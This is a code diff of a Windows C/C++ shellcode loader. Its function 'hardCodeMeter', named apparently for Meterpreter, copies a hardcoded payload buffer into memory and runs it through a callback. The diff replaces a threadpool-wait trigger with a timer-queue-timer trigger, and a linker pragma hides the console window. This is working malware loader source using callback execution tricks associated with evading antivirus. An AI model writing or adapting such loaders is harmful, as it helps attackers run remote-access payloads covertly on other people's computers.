@@ -1,11 +1,9 @@
 #pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
 #define _CRT_SECURE_NO_DEPRECATE
-#include "stdafx.h"
 #include <string.h>
 #include <windows.h>
 #include <stdlib.h>
 #include <stdio.h>
-#include <threadpoolapiset.h>
 
 void StringToHex(char* str, unsigned char* out) {
 	char* p = str;
@@ -38,17 +36,17 @@ void hardCodeMeter() {
 	RtlMoveMemory(ptr, buffer, sizeof(buffer));
 
 	//callback
-	HANDLE hEvent;
-	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
-	PTP_WAIT ptp_w = CreateThreadpoolWait((PTP_WAIT_CALLBACK)ptr, NULL, NULL);
-	SetThreadpoolWait(ptp_w, hEvent, 0);
-	SetEvent(hEvent);
-	WaitForThreadpoolWaitCallbacks(ptp_w, FALSE);
-	SetEvent(hEvent);
-	while (TRUE)
-	{
-		Sleep(10000);
+	HANDLE timer;
+	HANDLE queue = ::CreateTimerQueue();
+	HANDLE gDoneEvent = ::CreateEvent(NULL, TRUE, FALSE, NULL);
+	if (!::CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)ptr, NULL, 100, 0, 0)) {
+
+		printf("Fail");
 	}
+
+	if (::WaitForSingleObject(gDoneEvent, INFINITE) != WAIT_OBJECT_0)
+		printf("WaitForSingleObject failed (%d)\n", GetLastError());
+
 }
 
 
